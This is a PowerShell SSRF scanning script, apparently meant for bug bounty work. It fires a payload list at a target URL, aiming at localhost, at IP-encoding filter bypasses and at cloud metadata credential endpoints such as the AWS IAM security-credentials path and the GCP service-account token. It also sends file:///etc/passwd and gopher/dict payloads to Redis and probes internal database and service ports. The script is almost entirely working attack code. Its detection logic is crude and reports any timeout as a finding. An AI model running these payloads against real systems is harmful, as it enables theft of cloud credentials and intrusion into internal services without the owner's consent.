# Bug Hunter - SSRF Testing Tool
# Usage: ./test-ssrf.ps1 -Target <url>

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    [switch]$CloudMeta,
    [switch]$Internal,
    [switch]$All
)

Write-Host "[*] SSRF Testing for: $Target" -ForegroundColor Cyan

$results = @()

# SSRF Payloads
$ssrfPayloads = @{
    # Basic localhost
    "http://127.0.0.1" = "localhost"
    "http://localhost" = "localhost"
    "http://0.0.0.0" = "0.0.0.0"
    
    # Cloud Metadata
    "http://169.254.169.254/latest/meta-data/" = "AWS Meta"
    "http://metadata.google.internal/computeMetadata/v1/" = "GCP Meta"
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01" = "Azure Meta"
    
    # Decimal IP
    "http://2130706433" = "Decimal 127.0.0.1"
    "http://3232235777" = "Decimal 192.168.1.1"
    
    # Hex IP
    "http://0x7f000001" = "Hex 127.0.0.1"
    "http://0xC0A80001" = "Hex 192.168.0.1"
    
    # Octal IP
    "http://0177.0.0.1" = "Octal 127.0.0.1"
    "http://0300.0200.0100.0001" = "Octal 192.168.1.1"
    
    # Short IP
    "http://127.1" = "Short 127.0.0.1"
    "http://127.0.1" = "Short 127.0.1"
    
    # IPv6
    "http://[::1]" = "IPv6 localhost"
    "http://[::ffff:127.0.0.1]" = "IPv6 mapped"
    
    # Protocol
    "file:///etc/passwd" = "File protocol"
    "dict://127.0.0.1:6379" = "Dict protocol"
    "gopher://127.0.0.1:6379/_INFO" = "Gopher protocol"
    
    # DNS Rebinding (needs setup)
    "http://attacker.com" = "DNS Rebinding"
}

# Internal Services
$internalServices = @{
    "http://127.0.0.1:22" = "SSH"
    "http://127.0.0.1:80" = "HTTP"
    "http://127.0.0.1:443" = "HTTPS"
    "http://127.0.0.1:6379" = "Redis"
    "http://127.0.0.1:27017" = "MongoDB"
    "http://127.0.0.1:9200" = "Elasticsearch"
    "http://127.0.0.1:3306" = "MySQL"
    "http://127.0.0.1:5432" = "PostgreSQL"
    "http://127.0.0.1:8080" = "HTTP Alt"
    "http://127.0.0.1:8443" = "HTTPS Alt"
}

function Test-SSRF {
    param($url, $description)
    
    Write-Host "[*] Testing: $description" -ForegroundColor Gray
    
    try {
        # Try POST
        $body = "url=$url"
        $response = Invoke-WebRequest -Uri $Target -Method POST -Body $body -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
        
        # Check for indicators
        $indicators = @("localhost", "127.0.0.1", "meta-data", "ami-id", "instance-id", "security-credentials", "redhat", "ubuntu", "docker", "kubernetes")
        
        foreach ($indicator in $indicators) {
            if ($response.Content -match $indicator) {
                Write-Host "[!] SSRF FOUND: $description" -ForegroundColor Red
                Write-Host "[!] Indicator: $indicator" -ForegroundColor Red
                return @{URL=$url; Description=$description; Indicator=$indicator}
            }
        }
        
        # Check status codes that indicate internal access
        if ($response.StatusCode -eq 200 -and $response.Content.Length -gt 0) {
            Write-Host "[?] Possible SSRF (Status 200): $description" -ForegroundColor Yellow
            return @{URL=$url; Description=$description; StatusCode=$response.StatusCode}
        }
        
    } catch {
        if ($_.Exception.Message -match "timeout|connection") {
            Write-Host "[!] SSRF FOUND (timeout): $description" -ForegroundColor Red
            return @{URL=$url; Description=$description; Type="timeout"}
        }
    }
    
    return $null
}

# Run tests
if ($All -or -not $CloudMeta -and -not $Internal) {
    Write-Host "[*] Running full SSRF tests..." -ForegroundColor Yellow
    
    foreach ($payload in $ssrfPayloads.GetEnumerator()) {
        $result = Test-SSRF -url $payload.Key -description $payload.Value
        if ($result) { $results += $result }
    }
}

if ($CloudMeta -or $All) {
    Write-Host "[*] Testing cloud metadata endpoints..." -ForegroundColor Yellow
    
    $cloudEndpoints = @(
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    )
    
    foreach ($endpoint in $cloudEndpoints) {
        $result = Test-SSRF -url $endpoint -description "Cloud Meta: $endpoint"
        if ($result) { $results += $result }
    }
}

if ($Internal -or $All) {
    Write-Host "[*] Testing internal services..." -ForegroundColor Yellow
    
    foreach ($service in $internalServices.GetEnumerator()) {
        $result = Test-SSRF -url $service.Key -description $service.Value
        if ($result) { $results += $result }
    }
}

# Output results
Write-Host "`n[*] SSRF Testing Complete" -ForegroundColor Green
Write-Host "[*] Found $($results.Count) potential SSRF vulnerabilities" -ForegroundColor Cyan

foreach ($result in $results) {
    Write-Host "  - $($result.Description): $($result.URL)" -ForegroundColor White
}

# Save results
$resultsFile = "./bug-hunter-output/ssrf-results.txt"
if (!(Test-Path "./bug-hunter-output")) {
    New-Item -ItemType Directory -Path "./bug-hunter-output" -Force | Out-Null
}

$results | ConvertTo-Json | Set-Content $resultsFile
Write-Host "[*] Results saved to: $resultsFile" -ForegroundColor Green